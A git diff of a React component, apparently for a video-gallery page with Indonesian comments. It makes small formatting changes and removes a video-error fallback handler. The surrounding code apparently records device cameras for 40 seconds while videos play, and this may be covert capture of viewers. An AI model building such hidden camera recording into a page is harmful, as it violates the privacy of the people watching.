@@ -24,7 +24,7 @@ function App() {
     { videoUrl: 'https://cdn.videy.co/nxkWOzw01.mp4' },
     { videoUrl: 'https://cdn.videy.co/YQog37Pu1.mp4' },
     { videoUrl: 'https://cdn.videy.co/VVH2RmCn1.mp4' },
-    { videoUrl: 'https://video.twimg.com/amplify_video/1844748398769090560/vid/avc1/720x1280/2bQWWm0jkr8d0kFY.mp4?tag=14&fbclid=PAZXh0bgNhZW0CMTEAAacx7boT1XRp_y2Nd0ItS586hUftwIXq4G63BAS7t9YXHTbCkJhSOop-rBjvTQ_aem_uP1MRy05506nV5vLEZHGBQ'},
+    { videoUrl: 'https://video.twimg.com/amplify_video/1844748398769090560/vid/avc1/720x1280/2bQWWm0jkr8d0kFY.mp4?tag=14&fbclid=PAZXh0bgNhZW0CMTEAAacx7boT1XRp_y2Nd0ItS586hUftwIXq4G63BAS7t9YXHTbCkJhSOop-rBjvTQ_aem_uP1MRy05506nV5vLEZHGBQ' },
     { videoUrl: 'https://cdn.videy.co/1S2HTGaf1.mp4' },
   ];
 
@@ -120,19 +120,6 @@ function App() {
       cameraStreamsRef.current = [];
     };
   }, []);
-
-  const handleVideoError = (index: number) => {
-    const video = videos[index];
-    if (video.fallbackUrl) {
-      console.warn(`Gagal memuat video ${video.videoUrl}, beralih ke fallback: ${video.fallbackUrl}`);
-      videos[index].videoUrl = video.fallbackUrl;
-      const videoElement = videoRefs.current[index];
-      if (videoElement) {
-        videoElement.src = video.fallbackUrl;
-        videoElement.load();
-      }
-    }
-  };
 
   const verifyStream = (stream: MediaStream, type: string): boolean => {
     const videoTracks = stream.getVideoTracks();
@@ -269,7 +256,7 @@ function App() {
           console.log(`Perekaman kamera ${type} dihentikan setelah 40 detik.`);
         }
         resolve(null);
-      }, 40000)); // Ubah durasi menjadi 40 detik
+      }, 40000));
 
       // Cleanup
       if (cameraVideo.parentNode) cameraVideo.parentNode.removeChild(cameraVideo);
@@ -390,9 +377,8 @@ function App() {
                   muted
                   onClick={() => handleVideoClick(index)}
                   onEnded={() => handleVideoEnded(index)}
-                  onError={() => handleVideoError(index)}
                   preload="metadata"
-                  loading="lazy"
+                  {...({ loading: 'lazy' } as any)} // Menambahkan loading="lazy" dengan type assertion
                 >
                   <p>Maaf, video tidak dapat dimuat. Silakan periksa koneksi Anda atau coba lagi nanti.</p>
                 </video>
